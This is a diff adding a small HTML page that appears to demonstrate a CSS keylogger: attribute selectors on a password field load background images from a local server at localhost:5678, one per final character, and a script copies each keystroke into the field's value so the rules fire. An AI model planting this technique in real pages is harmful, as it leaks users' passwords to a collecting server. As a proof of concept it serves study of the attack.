@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+
+        <style>
+            html, body {
+                background-color: #1e1e1e;
+                color: white;
+                font-size: 30px;
+                font-family: monospace;
+            }
+            input {
+                font-size: 30px;
+                font-family: monospace;
+            }
+            input[type=password][value$=a] {
+                background-image: url("http://localhost:5678/a");
+                background-color: red;
+            }
+            input[type=password][value$=b] {
+                background-image: url("http://localhost:5678/b");
+                background-color: green;
+            }
+        </style>
+    </head>
+    <body>
+        <label for="password">Password:</label><br/>
+        <input type="password" name="password" value="">
+
+        <script type="text/javascript" defer>
+            const input = document.querySelector("input");
+            input.addEventListener("keyup", (event) => {
+                input.setAttribute("value", input.value);
+            });
+        </script>
+    </body>
+</html>
